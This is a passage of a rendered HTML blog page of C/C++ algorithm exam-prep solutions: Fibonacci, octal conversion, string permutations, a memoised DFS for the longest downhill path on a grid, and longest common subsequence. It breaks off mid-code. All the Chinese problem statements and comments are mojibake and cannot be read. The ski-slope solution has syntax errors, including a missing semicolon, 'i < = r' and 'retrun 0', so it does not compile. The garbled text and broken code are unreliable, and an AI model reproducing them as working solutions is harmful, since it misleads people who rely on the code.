  dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">2</span> ; i &lt;= n; i++)&#123;</span><br><span class="line">        dp[i] = (dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>])%l;   <span class="comment">//å…³é”®æ˜¯è¿™ä¸ªé€’æ¨å¼</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;dp[n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;solve_1(n)&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//é€’å½’</span></span><br><span class="line">        solve_2(n); <span class="comment">//åŠ¨æ€è§„åˆ’</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è¿›åˆ¶è½¬æ¢-è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„"><a href="#è¿›åˆ¶è½¬æ¢-è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„" class="headerlink" title="è¿›åˆ¶è½¬æ¢(è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„)"></a>è¿›åˆ¶è½¬æ¢(è€ƒè¯•è€ƒäº†ç±»ä¼¼çš„)</h3><h4 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>è¾“å…¥ä¸€ä¸ªåè¿›åˆ¶æ­£æ•´æ•°ï¼Œç„¶åè¾“å‡ºå®ƒæ‰€å¯¹åº”çš„å…«è¿›åˆ¶æ•°ã€‚</p><h5 id="è¾“å…¥-2"><a href="#è¾“å…¥-2" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>è¾“å…¥ä¸€ä¸ªåè¿›åˆ¶æ­£æ•´æ•°n(1â‰¤nâ‰¤106) ã€‚</p><h5 id="è¾“å‡º-2"><a href="#è¾“å‡º-2" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>è¾“å‡ºnå¯¹åº”çš„å…«è¿›åˆ¶æ•°ï¼Œè¾“å‡ºåœ¨ä¸€è¡Œã€‚</p><h5 id="æ ·ä¾‹è¾“å…¥-2"><a href="#æ ·ä¾‹è¾“å…¥-2" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-2"><a href="#æ ·ä¾‹è¾“å‡º-2" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> num)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> tmp=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(num!=<span class="number">0</span>)&#123;</span><br><span class="line">tmp = num%<span class="number">8</span>;</span><br><span class="line">num = num/<span class="number">8</span>;</span><br><span class="line">s[i++] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>;j&gt;=<span class="number">0</span>;j--)&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;s[j];</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*è¿™ä¸ªé¢˜ç›®ä¹Ÿå¯ä»¥ç”¨æ ˆå»æ¨¡æ‹Ÿï¼Œå‡ è¿›åˆ¶è‡ªå·±çµæ´»å˜é€š*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">solve(a);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ’åˆ—é—®é¢˜"><a href="#æ’åˆ—é—®é¢˜" class="headerlink" title="æ’åˆ—é—®é¢˜"></a>æ’åˆ—é—®é¢˜</h3><h4 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>è¾“å…¥ä¸€ä¸ªå¯èƒ½å«æœ‰é‡å¤å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œæ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å­—ç¬¦çš„å…¨æ’åˆ—ã€‚</p><h5 id="è¾“å…¥-3"><a href="#è¾“å…¥-3" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>å•ç»„æµ‹è¯•æ•°æ®ï¼Œè¾“å…¥æ•°æ®æ˜¯ä¸€ä¸ªé•¿åº¦ä¸è¶…è¿‡10ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œä»¥é€—å·ç»“å°¾ã€‚</p><h5 id="è¾“å‡º-3"><a href="#è¾“å‡º-3" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²ä¸­æ‰€æœ‰å­—ç¬¦çš„å…¨æ’åˆ—ã€‚ä»¥å­—å…¸åºé¡ºåºè¾“å‡ºï¼Œç”¨ç©ºæ ¼åˆ†éš”ã€‚</p><h5 id="æ ·ä¾‹è¾“å…¥-3"><a href="#æ ·ä¾‹è¾“å…¥-3" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc,</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-3"><a href="#æ ·ä¾‹è¾“å‡º-3" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc acb bac bca cab cba</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> a[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"><span class="keyword">int</span> lena = <span class="built_in">strlen</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lena<span class="number">-1</span>; i++ ) &#123; <span class="built_in">cout</span> &lt;&lt; a[i]; &#125; <span class="built_in">cout</span> &lt;&lt; <span class="string">" "</span>; </span><br><span class="line">&#125; <span class="keyword">while</span>( next_permutation(a, a+lena<span class="number">-1</span>) );  <span class="comment">//å…³é”®æ˜¯è¿™ä¸ªå‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å…¨æ’åˆ—"><a href="#å…¨æ’åˆ—" class="headerlink" title="å…¨æ’åˆ—"></a>å…¨æ’åˆ—</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Perm</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">list</span>,<span class="keyword">int</span> k,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>( k == m)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ;i &lt;= m; i++) <span class="built_in">cout</span>&lt;&lt;<span class="built_in">list</span>[i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=k; i&lt;=m; i++)&#123;</span><br><span class="line">swap(<span class="built_in">list</span>[k],<span class="built_in">list</span>[i]);</span><br><span class="line">Perm(<span class="built_in">list</span>,k+<span class="number">1</span>,m);</span><br><span class="line">swap(<span class="built_in">list</span>[k],<span class="built_in">list</span>[i]);  <span class="comment">//å…³é”®æ˜¯æ¢ä½ä¹‹åè®°å¾—è¿˜åŸç°åœº</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"><span class="keyword">int</span> lena = <span class="built_in">strlen</span>(a);</span><br><span class="line">a[lena<span class="number">-1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">lena  = <span class="built_in">strlen</span>(a);</span><br><span class="line">sort(a,a+lena);</span><br><span class="line">Perm(a,<span class="number">0</span>,lena<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="çŸ©å½¢æ»‘é›ªåœº"><a href="#çŸ©å½¢æ»‘é›ªåœº" class="headerlink" title="çŸ©å½¢æ»‘é›ªåœº"></a>çŸ©å½¢æ»‘é›ªåœº</h3><h4 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>zcbå–œæ¬¢æ»‘é›ªã€‚ä»–æ¥åˆ°äº†ä¸€ä¸ªæ»‘é›ªåœºï¼Œè¿™ä¸ªæ»‘é›ªåœºæ˜¯ä¸€ä¸ªçŸ©å½¢ï¼Œä¸ºäº†ç®€ä¾¿ï¼Œæˆ‘ä»¬ç”¨rè¡Œcåˆ—çš„çŸ©é˜µæ¥è¡¨ç¤ºæ¯å—åœ°å½¢ã€‚ä¸ºäº†å¾—åˆ°æ›´å¿«çš„é€Ÿåº¦ï¼Œæ»‘è¡Œçš„è·¯çº¿å¿…é¡»å‘ä¸‹å€¾æ–œã€‚ ä¾‹å¦‚æ ·ä¾‹ä¸­çš„é‚£ä¸ªçŸ©å½¢ï¼Œå¯ä»¥ä»æŸä¸ªç‚¹æ»‘å‘ä¸Šä¸‹å·¦å³å››ä¸ªç›¸é‚»çš„ç‚¹ä¹‹ä¸€ã€‚ä¾‹å¦‚24-17-16-1ï¼Œå…¶å®25-24-23â€¦3-2-1æ›´é•¿ï¼Œäº‹å®ä¸Šè¿™æ˜¯æœ€é•¿çš„ä¸€æ¡ã€‚</p><h5 id="è¾“å…¥-4"><a href="#è¾“å…¥-4" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>ç¬¬1è¡Œ:ä¸¤ä¸ªæ•°å­—rï¼Œc(1 â‰¤ r, c â‰¤ 100)ï¼Œè¡¨ç¤ºçŸ©é˜µçš„è¡Œåˆ—ã€‚ç¬¬2..r+1è¡Œ:æ¯è¡Œcä¸ªæ•°ï¼Œè¡¨ç¤ºè¿™ä¸ªçŸ©é˜µã€‚</p><h5 id="è¾“å‡º-4"><a href="#è¾“å‡º-4" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>ä»…ä¸€è¡Œ:è¾“å‡º1ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºå¯ä»¥æ»‘è¡Œçš„æœ€å¤§é•¿åº¦ã€‚</p><h5 id="æ ·ä¾‹è¾“å…¥-4"><a href="#æ ·ä¾‹è¾“å…¥-4" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5 5</span><br><span class="line">1 2 3 4 5</span><br><span class="line">16 17 18 19 6</span><br><span class="line">15 24 25 20 7</span><br><span class="line">14 23 22 21 8</span><br><span class="line">13 12 11 10 9</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-4"><a href="#æ ·ä¾‹è¾“å‡º-4" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> r,c;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">105</span>][<span class="number">105</span>];</span><br><span class="line"><span class="keyword">int</span> record[<span class="number">105</span>][<span class="number">105</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m_x[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m_y[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(record[x][y]) <span class="keyword">return</span> record[x][y];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> i&lt; <span class="number">4</span> ;i++)&#123;  <span class="comment">//å¾€å››ä¸ªæ–¹å‘æ·±æœ</span></span><br><span class="line"><span class="keyword">int</span> wx = x+ m_x[i];</span><br><span class="line"><span class="keyword">int</span> wy = y+ m_y[i];</span><br><span class="line"><span class="keyword">if</span>(wx &gt;= <span class="number">1</span> &amp;&amp; wx &lt;= r &amp;&amp; wy &gt;=<span class="number">1</span> &amp;&amp; wy&lt;= c &amp;&amp; m[x][y] &gt; m[wx][wy])&#123;</span><br><span class="line">record[x][y] = max(record[x][y], dfs(wx,wy)+<span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> record[x][y];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;r&gt;&gt;c;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i &lt;=r ;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j&lt;=c;j++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;m[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> result  =<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i &lt; = r; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span> ; j&lt;=c;j++)&#123;</span><br><span class="line">record[i][j] = dfs(i,j);</span><br><span class="line">result = max(record[i][j],result);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result + <span class="number">1</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">retrun <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åŠ¨æ€è§„åˆ’"><a href="#åŠ¨æ€è§„åˆ’" class="headerlink" title="åŠ¨æ€è§„åˆ’"></a>åŠ¨æ€è§„åˆ’</h2><p>è¿™ç§é¢˜ç›®å…³é”®è®°ä½dpå…¬å¼å°±å¥½ä¹¦ä¸Šéƒ½æœ‰ä¸å¤šè¯´</p><h3 id="æœ€é•¿å…¬å…±å­åºåˆ—"><a href="#æœ€é•¿å…¬å…±å­åºåˆ—" class="headerlink" title="æœ€é•¿å…¬å…±å­åºåˆ—"></a>æœ€é•¿å…¬å…±å­åºåˆ—</h3><h4 id="é¢˜ç›®æè¿°-5"><a href="#é¢˜ç›®æè¿°-5" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>ç»™ä½ ä¸€ä¸ªåºåˆ—Xå’Œå¦ä¸€ä¸ªåºåˆ—Zï¼Œå½“Zä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½åœ¨Xä¸­å­˜åœ¨ï¼Œå¹¶ä¸”åœ¨Xä¸­çš„ä¸‹æ ‡é¡ºåºæ˜¯ä¸¥æ ¼é€’å¢çš„ï¼Œé‚£ä¹ˆå°±æŠŠZå«åšXçš„å­åºåˆ—ã€‚<br>ä¾‹å¦‚ï¼šZ=&lt;a,b,f,c&gt;æ˜¯åºåˆ—X=&lt;a,b,c,f,b,c&gt;çš„ä¸€ä¸ªå­åºåˆ—ï¼ŒZä¸­çš„å…ƒç´ åœ¨Xä¸­çš„ä¸‹æ ‡åºåˆ—ä¸º&lt;1,2,4,6&gt;ã€‚<br>ç°ç»™ä½ ä¸¤ä¸ªåºåˆ—Xå’ŒYï¼Œè¯·é—®å®ƒä»¬çš„æœ€é•¿å…¬å…±å­åºåˆ—çš„é•¿åº¦æ˜¯å¤šå°‘ï¼Ÿ</p><h5 id="è¾“å…¥-5"><a href="#è¾“å…¥-5" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚æ¯ç»„è¾“å…¥å ä¸€è¡Œï¼Œä¸ºä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œç”±è‹¥å¹²ä¸ªç©ºæ ¼åˆ†éš”ã€‚æ¯ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ä¸è¶…è¿‡100ã€‚</p><h5 id="è¾“å‡º-5"><a href="#è¾“å‡º-5" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>å¯¹äºæ¯ç»„è¾“å…¥ï¼Œè¾“å‡ºä¸¤ä¸ªå­—ç¬¦ä¸²çš„æœ€é•¿å…¬å…±å­åºåˆ—çš„é•¿åº¦ã€‚</p><h5 id="æ ·ä¾‹è¾“å…¥-5"><a href="#æ ·ä¾‹è¾“å…¥-5" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcfbc abfcab</span><br><span class="line">programming contest </span><br><span class="line">abcd mnp</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-5"><a href="#æ ·ä¾‹è¾“å‡º-5" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">2</span><br><span class="line">0</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> c[<span class="number">2005</span>][<span class="number">2005</span>];</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">2005</span>][<span class="number">2005</span>];</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">2005</span>],b[<span class="number">2005</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*æ„é€ æœ€ä¼˜è§£*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LCS</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i ==<span class="number">0</span>|| j==<span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(m[i][j] == <span class="number">1</span>)&#123;</span><br><span class="line">LCS(i<span class="number">-1</span>,j<span class="number">-1</span>);</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a[i<span class="number">-1</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(m[i][j] == <span class="number">2</span>)&#123;</span><br><span class="line">LCS(i<span class="number">-1</span>,j);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">LCS(i,j<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> lena,<span class="keyword">int</span> lenb)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i &lt;=lena ;i++)&#123;</span><br><span class="line">c[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">0</span>;j&lt;=lenb;j++)&#123;</span><br><span class="line">c[<span class="number">0</span>][j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=lena;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=lenb;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i<span class="number">-1</span>] == b[j<span class="number">-1</span>]) &#123;</span><br><span class="line">c[i][j] = c[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">m[i][j] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(c[i<span class="number">-1</span>][j] &gt;= c[i][j<span class="number">-1</span>])&#123;</span><br><span class="line">c[i][j] = c[i<span class="number">-1</span>][j];</span><br><span class="line">m[i][j] =<span class="number">2</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">c[i][j] = c[i][j<span class="number">-1</span>];</span><br><span class="line">m[i][j] = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; c[lena][lenb]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//LCS(lena,lenb);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line"><span class="keyword">int</span> lena = <span 